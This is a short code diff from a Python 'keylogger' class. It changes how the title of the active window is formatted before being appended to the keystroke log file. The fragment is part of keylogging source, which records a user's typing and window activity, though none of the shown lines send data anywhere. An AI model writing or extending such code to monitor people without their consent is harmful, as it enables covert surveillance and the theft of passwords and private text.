@@ -58,7 +58,7 @@ class keylogger():
 
         with open(self.keylog_txt_name, 'a') as file:
             if self.previous_action == 'Key': file.write('\n')
-            file.write(f"\n########## {current_active_window} ##########\n")
+            file.write(f"\n########## {str(current_active_window)[2:-1]} ##########\n")
         # if self.previous_action == 'Key': print()
         # print(f"\n########## {current_active_window} ##########")
         self.previous_action = 'Window'
